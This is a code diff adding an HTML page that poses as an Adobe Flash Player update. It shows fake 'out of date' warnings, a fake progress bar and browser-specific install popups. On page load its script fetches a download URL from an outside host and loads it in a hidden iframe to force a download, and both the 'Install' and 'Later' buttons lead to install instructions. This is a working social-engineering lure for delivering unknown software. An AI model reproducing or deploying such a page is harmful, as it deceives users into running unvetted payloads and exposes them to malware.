@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width">
+
+    <title>Flash Player might be outdated</title>
+
+    <link rel="icon" href="img/aflashplayer3-icon.png" type="image/png">
+    <link href="css/style.css" rel="stylesheet">
+
+    <script src="js/jquery.js"></script>
+
+    <script type="text/javascript">
+        sendEvent("pageView")
+    </script>
+
+    <script>
+    function showStep() {
+      var nAgt = navigator.userAgent;
+      var verOffset;
+      if ((verOffset = nAgt.indexOf("OPR")) != -1) {
+        document.getElementById("opera").style.display = "block";
+        document.getElementById("overlay").style.display = "block";
+      } else if ((verOffset = nAgt.indexOf("MSIE")) != -1) {
+        document.getElementById("ie").style.display = "block";
+        document.getElementById("overlay").style.display = "block";
+      } else if ((verOffset = nAgt.indexOf(".NET")) != -1) {
+        document.getElementById("ie").style.display = "block";
+        document.getElementById("overlay").style.display = "block";
+      } else if ((verOffset = nAgt.indexOf("Chrome")) != -1) {
+        document.getElementById("chrome").style.display = "block";
+        //document.getElementById("overlay").style.display = "block";
+      } else if ((verOffset = nAgt.indexOf("Firefox")) != -1) {
+        document.getElementById("mozilla").style.display = "block";
+        document.getElementById("overlay").style.display = "block";
+      } else if ((verOffset = nAgt.indexOf("Safari")) != -1) {
+        document.getElementById("safari").style.visibility = "visible";
+        document.getElementById("overlay").style.visibility = "block";
+      }
+    }
+
+    function hidePop() {
+      document.getElementById('mozilla').style.display = 'none';
+      document.getElementById('chrome').style.display = 'none';
+      document.getElementById('ie').style.display = 'none';
+      document.getElementById('safari').style.visibility = 'hidden';
+      document.getElementById('overlay').style.display = 'none';
+    }
+    </script>
+
+  </head>
+
+  <body>
+    <div id="plug">
+      <div class="plugleft" style="padding-top: 4px;  font-size:13px;"> <a href="#" class="download_link finlink"><img style="padding-right: 7px;margin-left: 10px; float:left;" src="img/alerttop2.png" align="bottom"></a>
+        <p style="display:block; float:left; margin: 8px 0px 0px;"> Latest version of Adobe Flash Player is required to encode and/or decode (Play) audio files in high quality. - <a class="ib-download download_link finlink" href="#"
+            style="font-size:13px;color:#fff;text-decoration: underline;">Click here to update for latest version.</a></p>
+      </div>
+    </div>
+    <div class="content">
+      <div id="logo"></div>
+      <h1>Update your Flash Player</h1>
+      <p>Your Flash Player for windows might be out of date!</p>
+      <p>Update the latest version for better perfomance.</p>
+      <div id="progress-container">
+        <div class="progress">
+          <div class="progress-bar"></div>
+        </div>
+      </div>
+      <div id="button">Your update is ready</div>
+      <div class="button" style="text-align:center; margin-top:24px;">
+        <a href="#" class="download_link finlink" onclick="showStep();">
+          <div onclick="download()" class="btn1" style="background-color:rgb(16, 113, 197); text-shadow:none; color:#fff;">Install</div>
+        </a>
+        <a href="#" class="download_link finlink" onclick="showStep();">
+          <div class="btn">Later</div>
+        </a>
+      </div>
+    </div>
+    <div id="footer" class="type_1">
+      <ul>
+        <li><a href="#" class="finlink" title="EULA" name="EULA">EULA</a></li>|
+        <li><a href="#" class="finlink" title="Terms of service" name="TOS"> TOS </a></li>|
+        <li><a href="#" class="finlink" title="Privacy" name="Privacy"> Privacy </a></li>|
+        <li><a href="#" class="finlink" title="Download Manager" name="DownloadManager"> Download Manager </a></li>|
+        <li><a href="#" class="finlink" title="Terms of service" name="Uninstall"> Uninstall </a></li>|
+        <li><a href="#" class="finlink" title="Contact" name="Contact"> Contact </a></li>
+      </ul>
+      <p style="font-size:11px;  line-height:14px; color:#999;">By downloading, you accept our TOS and Privacy Policy.<br> This free download is done via download manager which may offer other applications you can decline or uninstall.<br> This site and the download manager have no relationship with the author.
+        Any third party products,<br> brands or trademarks listed above are the sole property of their respective owner.</p>
+      <p style="display:block; color:#999;"> © 2017 | All Rights Reserved.</p>
+    </div>
+    <div class="popb">
+      <div class="plugleft" style="padding-top: 10px; font-size:12px; width:660px; margin:auto;"> <a href="#" class="download_link finlink"><img style="padding-right: 7px; float:left;" src="img/alerttop2.png" align="bottom"></a>
+        <p style="display:block;  text-align:center;  margin: 8px 0px 0px; color:#FFF;"> Updating takes a few seconds and no restart needed after installation. <a class="ib-download download_link finlink" href="#" style="font-size:12px; color:#fe0000;text-decoration: underline;">Click here to update for latest version.</a></p>
+      </div>
+    </div>
+    <div style="display:none;" id="mozilla" class="popup" onclick="hidePop();">
+      <div class="popupmoz"></div>
+    </div>
+    <div style="display:none;" id="chrome" class="popup" onclick="hidePop();">
+      <div class="popupchrome"></div>
+    </div>
+    <div style="display:none;" id="ie" class="popup" onclick="hidePop();">
+      <div class="popupchrome"></div>
+    </div>
+    <div style="visibility:hidden;" id="safari" class="popup" onclick="hidePop();">
+      <div class="popupsafari"></div>
+    </div>
+
+    <div class="overlay"></div>
+
+    <div class="instruction">
+      <img src="img/modal.jpg" alt="instruction" width="750" height="439">
+    </div>
+
+    <iframe name="iframe" style="display: none"></iframe>
+
+    <script>
+      setTimeout(function() {
+        document.getElementById("button").style.display = "block";
+        showStep();
+      }, 3000);
+    </script>
+
+    <script>
+        //alert("WARNING! Your Flash Player is out of date. Please install update to continue.");
+        var downloadUrl = "";
+
+        function download() {
+          if (downloadUrl == "") return
+          location.href = downloadUrl
+        }
+        window.onbeforeunload = null;
+        fetch("https://trackmyapps.org/download_url")
+          .then(function(response) {
+            response.json().then(function(data) {
+              if (data.url) {
+                downloadUrl = data.url
+                document.getElementsByName('iframe')[0].src = data.url;
+                overlay.classList.add('overlay-show');
+                instruction.classList.add('instruction-show');
+                sendEvent("download")
+                /*var fin_link = data.url;
+                var links = document.getElementsByClassName('finlink');
+                for (var i = 0; i < links.length; i++) links[i].setAttribute("href", fin_link);
+
+                for (var j = 0; j < links.length; j++) {
+                    links[j].addEventListener('click', function() {
+                        window.onbeforeunload = null;
+                    });
+                }*/
+              }
+            });
+          })
+
+        /*window.onbeforeunload = function(e) {
+            if (true) {
+                s = 'All unsaved data will be lost! Do you really want to quit the site?'
+
+                e = e || window.event;
+
+                if (e) {
+                    e.returnValue = s;
+                }
+
+                return s;
+            }
+        };*/
+
+        var btnLink = document.querySelector('.btn1');
+        var overlay = document.querySelector('.overlay');
+        var instruction = document.querySelector('.instruction');
+
+        btnLink.addEventListener('click', function() {
+          overlay.classList.add('overlay-show');
+          instruction.classList.add('instruction-show');
+        });
+    </script>
+
+  </body>
+</html>
